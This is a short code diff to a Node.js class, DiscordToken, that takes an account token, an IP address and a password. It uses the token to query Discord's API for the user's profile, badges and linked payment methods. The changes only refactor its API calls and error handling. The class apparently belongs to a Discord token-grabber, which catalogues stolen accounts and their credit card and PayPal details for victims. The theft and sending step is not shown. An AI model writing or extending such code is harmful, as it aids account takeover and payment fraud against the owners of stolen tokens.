@@ -3,8 +3,6 @@ const request = require("sync-request");
 
 module.exports = class DiscordToken { 
   constructor(token, ipAddress, password) {
-    this.info = {};
-    this.paymentSources = "";
     const user = this.getDiscordApi("https://discord.com/api/v9/users/@me", token);
     const profile = this.getDiscordApi(
       `https://discord.com/api/v9/users/${Buffer.from(
@@ -49,7 +47,7 @@ module.exports = class DiscordToken {
       }
     }
     if (!user || user === "Invalid") {
-      console.error("Token invalid or nonexistent");
+      this.info = {"message":"Token not found"};
       return;
     }
     let creditCard = false;
@@ -104,6 +102,7 @@ module.exports = class DiscordToken {
         ]
       },
     }
+    this.paymentSources = "";
     this.paymentSources = creditCard ? this.emojis.user.payments[0] : "";
     this.paymentSources += paypal ? this.emojis.user.payments[1] : "None";
     this.info = {
@@ -355,16 +354,13 @@ module.exports = class DiscordToken {
     } else return "None"
   }
   getDiscordApi(url, token) {
-    const response = request("GET", url, {
-      headers: {
-        "Content-Type": "application/json",
-        authorization: token,
-      },
-    });
-    if (response.statusCode === 200) {
-      const data = JSON.parse(response.getBody("utf8"));
-      return data.code === 0 ? "Invalid" : data;
-    }
+    const res = require("sync-fetch")(url, {
+        headers: {
+          "Content-Type": "application/json",
+          authorization: token
+        }
+    }).json();
+    return res.code == 0 ? "Invalid" : res
   }
   AllBadges(flags) {
     let result = "";
